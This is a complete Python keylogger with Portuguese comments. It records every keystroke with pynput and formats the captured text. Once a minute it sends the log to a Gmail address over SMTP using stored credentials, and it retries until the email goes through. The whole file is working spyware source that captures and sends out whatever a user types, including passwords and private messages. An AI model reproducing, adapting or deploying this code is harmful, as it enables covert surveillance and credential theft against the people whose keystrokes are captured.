import requests, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener, Controller
from user import usuario, senha
from time import sleep
import threading
import ctypes


teclado = Controller()  # Controlador de teclado
letras_com_aspas = []  # Variável que irá armazenar todas as letras pressionadas
letras_formatadas = []  # Váriavel que irá armazenar as letras formatadas para serem concatenadas antes de enviar


def tecla_pressionada(tecla):
    global cronometro_finalizou
    # Executa quando alguma tecla é pressionada
    try:
        # Se o cronômetro finalizar, não irá receber mais teclas até a mensagem ser enviada
        if cronometro_finalizou:
            pass
        else:
            # senão, a tecla vai ser adicionada na lista
            print(f"A tecla pressionada foi {tecla}")
            letras_com_aspas.append(tecla)

    except AttributeError:
        pass


def tempo_de_envio(n):
    global cronometro_finalizou
    # Quando o cronometro em segundo plano é encerrado, retorna False para o método "on_release" e envia a mensagem
    if cronometro_finalizou:
        return False


# A função abaixo não é usada no código, foi apenas um teste para a captura de teclas antes de enviar para o e-mail
# def escrever(letras):
#     # Escrever no arquivo
#     with open("log.txt", "a", encoding="UTF-8") as arquivo:
#         for letra in letras:
#             letra = str(letra).replace("'", "")
#             if letra == "Key.space":
#                 arquivo.write(" ")
#             elif letra == "Key.enter":
#                 arquivo.write("\n")
#             elif letra == "Key.tab":
#                 arquivo.write("    ")
#             else:
#                 arquivo.write(letra)


def formatar_letras(letras):
    global letras_formatadas

    # Transforma a letra em String e percorre a mesma "excluindo" com o replace as aspas e os colchetes que são
    # retornados pelo pynput
    for letra in letras:
        letra = str(letra).replace("[", "")
        letra = str(letra).replace("]", "")
        letra = str(letra).replace("'", "")
        if letra == "Key.esc":
            letras_formatadas.append("")
        if letra == "Key.space":
            letras_formatadas.append(" ")
        elif letra == "Key.enter":
            letras_formatadas.append("\n")
        elif letra == "Key.tab":
            letras_formatadas.append("    ")
        elif letra == "Key.shift" or letra == "Key.shift_r":
            letras_formatadas.append("")
        elif letra == "Key.caps_lock":
            letras_formatadas.append(" (CAPSLOCK) ")
        elif letra == "Key.ctrl_l" or letra == "Key.ctrl_r":
            letras_formatadas.append("")
        elif letra == "Key.menu":
            letras_formatadas.append("")
        elif letra == "Key.alt_l" or letra == "Key.alt_gr":
            letras_formatadas.append("")
        elif letra == "Key.f1" or letra == "Key.f2" or letra == "Key.f3" or letra == "Key.f4" or letra == "Key.f5" or letra == "Key.f6" or letra == "Key.f7" or letra == "Key.f8" or letra == "Key.f9" or letra == "Key.f10" or letra == "Key.f11" or letra == "Key.f12":
            letras_formatadas.append("")
        elif letra == "Key.cmd":
            letras_formatadas.append("")
        elif letra == "´":
            letras_formatadas.append(" (´) ")
        elif letra == "¨":
            letras_formatadas.append(" (¨) ")
        elif letra == "Key.print_screen":
            letras_formatadas.append(" (tirou print) ")
        elif letra == "Key.scroll_lock":
            letras_formatadas.append("")
        elif letra == "Key.pause":
            letras_formatadas.append("")
        elif letra == "Key.insert":
            letras_formatadas.append("")
        elif letra == "Key.home":
            letras_formatadas.append("")
        elif letra == "Key.page_up":
            letras_formatadas.append("")
        elif letra == "Key.delete":
            letras_formatadas.append("")
        elif letra == "Key.end":
            letras_formatadas.append("")
        elif letra == "Key.page_down":
            letras_formatadas.append("")
        elif letra == "`":
            letras_formatadas.append(" (`) ")
        elif letra == "^":
            letras_formatadas.append(" (^) ")
        elif letra == "<96>":
            letras_formatadas.append("0")
        elif letra == "<97>":
            letras_formatadas.append("1")
        elif letra == "<98>":
            letras_formatadas.append("2")
        elif letra == "<99>":
            letras_formatadas.append("3")
        elif letra == "<100>":
            letras_formatadas.append("4")
        elif letra == "<101>":
            letras_formatadas.append("5")
        elif letra == "<102>":
            letras_formatadas.append("6")
        elif letra == "<103>":
            letras_formatadas.append("7")
        elif letra == "<104>":
            letras_formatadas.append("8")
        elif letra == "<105>":
            letras_formatadas.append("9")
        elif letra == "<110>":
            letras_formatadas.append(".")
        elif letra == "Key.left":
            letras_formatadas.append(" (esquerda) ")
        elif letra == "Key.right":
            letras_formatadas.append(" (direita) ")
        elif letra == "Key.up":
            letras_formatadas.append(" (cima) ")
        elif letra == "Key.down":
            letras_formatadas.append(" (baixo) ")
        elif letra == "\\":
            letras_formatadas.append(" (contra-barra)")
        elif letra == "Key.backspace":
            # Caso haja algum elemento na lista, o último será apagado ao pressionar backspace
            if len(letras_formatadas) > 0:
                letras_formatadas.pop()
            # Senão holver, ele vai apenas ignorar
            else:
                pass
        # Se o elemento estiver não estiver em nenhuma exceção acima, será adicionado na lista "letras_formatadas"
        else:
            letras_formatadas.append(letra)


def juntar_letras(enviar):
    # Junta as mensagem que foram armazendas na lista em uma única String para ser enviada
    enviar = "".join(enviar)
    return enviar


def conexao_internet():
    try:
        # Tentar fazer uma requisição com algum servidor online
        requisicao = requests.get("https://www.google.com")
        if requisicao.status_code == 200:
            # Retorna True se a solicitação estiver OK
            return True
        else:
            # Retorna False se a solicitação NÃO estiver OK
            return False
    except (requests.ConnectionError, requests.exceptions.MissingSchema):
        # Apresentar a mensagem de erro se a conexão falhar
        print("Não foi possível se conectar ao servidor")


def enviar_email():
    global letras_com_aspas, letras_formatadas, tempo_total, cronometro_finalizou, mensagem_final

    # Credenciais de login
    USUARIO = usuario
    SENHA = senha

    # Remetente e Destinatário
    REMETENTE = USUARIO
    DESTINATARIO = USUARIO

    # Mensagem para enviar
    assunto_mensagem = "Log"
    mensagem = mensagem_final

    # Configurando servidor smtp
    servidor_smtp = "smtp.gmail.com"
    porta_smtp = 587  # A porta padrão da Lib também funciona, que é a 25, mas a 587 é mais comumente usada

    try:
        # Cria uma conexão com o servidor
        estabelecer_conexao = smtplib.SMTP(servidor_smtp, porta_smtp)

        # startttls() é um método opcional dependendendo do servidor, nem todos exigem (gmail.com exige, por exemplo)
        estabelecer_conexao.starttls()

        # Fazendo login na conta
        estabelecer_conexao.login(USUARIO, SENHA)

        # Criando mensagem para enviar
        msg = MIMEMultipart()
        msg["From"] = REMETENTE
        msg["To"] = DESTINATARIO
        msg["Subject"] = assunto_mensagem

        # Adicionando corpo do texto
        msg.attach(MIMEText(mensagem, 'plain'))

        # Enviando o e-mail
        estabelecer_conexao.sendmail(REMETENTE, DESTINATARIO, msg.as_string())
        print("Mensagem enviada")

        # Apaga os caracteres salvos na lista
        letras_com_aspas = []
        letras_formatadas = []

        # Inicia novamente o cronometro
        cronometro_finalizou = False
        tempo_total = threading.Thread(target=cronometro)
        tempo_total.start()

        # Se a mensagem for realmente enviada, retorna True, para sair do loop
        return True

    except Exception as erro:
        # Exibe um erro caso a mensagem não seja enviada (normalmente por spam)
        print(f"Ocorreu um erro de envio {erro}")


def cronometro():
    global cronometro_finalizou
    # Cronômetro inicia em segundo plano, enquanto captura as teclas
    # Caso queria alterar o tempo, mude o valor do temporizador e do range do loop
    temporizador = 60
    for t in range(60):
        temporizador -= 1
        sleep(1)

    print("Tempo acabou")
    cronometro_finalizou = True

    # Tecla qualquer sendo liberada pelo próprio programa para retornar False para o método "on_release"
    teclado.release(Key.esc)


cronometro_finalizou = False
threading.Thread(target=cronometro).start()

verificar_teclas = Listener  # váriavel instanciada (objeto) da classe Listerner
while True:
    # "Abre" a classe para receber duas funções como argumento para os atributos "on_press" e "on_release" chamando esse
    # procedimento de "verificar"
    with verificar_teclas(on_press=tecla_pressionada, on_release=tempo_de_envio) as verificar:
        # Inicia o o procedimento "verificar" a partir da função join() do pynput
        verificar.join()

    # Formata as letras que são capturadas
    formatar_letras(letras_com_aspas)

    # atribui à variável mensagem_final as letras formatadas que foram encaminhdas para a função juntar_letras()
    mensagem_final = juntar_letras(letras_formatadas)

    # Verifica se o tamanho da mensagem é maior ou igual a 1 caracter e se a conexão da internet está ok
    if len(mensagem_final) >= 1 and conexao_internet():

        # Se tudo estiver ok, entra no loop para enviar o e-mail. O loop serve para garantir que a mensagem seja enviada
        # Ou seja, se der algum erro de spam (por exemplo), ele tenta enviar a mensagem de novo.
        while True:
            if enviar_email():
                break
            enviar_email()

    else:
        # Se não estiver ok, ele reinicia o cronômetro e começa a capturar as teclas novamente
        # Ele não apaga as teclas que foram capturadas, caso caia no "else"
        cronometro_finalizou = False
        tempo_total = threading.Thread(target=cronometro)
        tempo_total.start()
